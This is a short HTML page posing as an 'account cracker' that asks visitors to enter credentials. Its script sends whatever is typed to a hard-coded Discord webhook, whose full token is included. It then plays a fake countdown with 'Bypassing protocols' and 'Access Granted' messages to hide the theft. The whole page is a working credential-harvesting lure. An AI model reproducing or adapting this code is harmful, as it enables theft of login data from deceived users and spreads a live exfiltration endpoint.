<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>UU ACOUNT CRACKER</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #1a1a1a; color: white; }
        #login-box { display: block; }
        
        /* The Loading Screen Styles */
        #loading-screen { display: none; }
        .spinner {
            border: 8px solid #333;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status-text { font-style: italic; color: #3498db; font-size: 1.2em; }
    </style>
</head>
<body>

    <div id="login-box">
        <h2>PUT TEXT IN THE BOX TO CRACK</h2>
        <input type="text" id="userInput" placeholder="Enter credentials">
        <button onclick="startLogin()">LOGIN</button>
    </div>

    <div id="loading-screen">
        <h2>PROCESSING...</h2>
        <div class="spinner"></div>
        <p id="timer">Time Remaining: 60s</p>
        <p id="status-text">Initializing...</p>
    </div>

    <script>
        async function startLogin() {
            const inputVal = document.getElementById('userInput').value;
            const webhookURL = 'https://discord.com/api/webhooks/1453764437608501472/M3izTOyXPaS_8RPHmqNDs-RXV8sApH8OG9jDA4gHd2_fzItzV3ZCNqcZAqNY1t2tXYi1';

            // 1. Send data to Discord immediately
            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: `New entry: ${inputVal}` }),
                });
            } catch (e) { console.error("Webhook error:", e); }

            // 2. Hide login and show loading screen
            document.getElementById('login-box').style.display = 'none';
            document.getElementById('loading-screen').style.display = 'block';

            // 3. Start the 60-second timer and status updates
            let secondsLeft = 60;
            const tips = ["Establishing connection...", "Almost in...", "Bypassing protocols...", "Decrypting...", "Finalizing access..."];
            
            const countdown = setInterval(() => {
                secondsLeft--;
                document.getElementById('timer').innerText = `Time Remaining: ${secondsLeft}s`;
                
                // Change status text every 12 seconds
                if (secondsLeft % 12 === 0 && tips.length > 0) {
                    document.getElementById('status-text').innerText = tips[Math.floor(Math.random() * tips.length)];
                }

                if (secondsLeft <= 0) {
                    clearInterval(countdown);
                    document.getElementById('status-text').innerText = "Access Granted!";
                    alert("Sequence Complete.");
                }
            }, 1000);
        }
    </script>
</body>
</html>
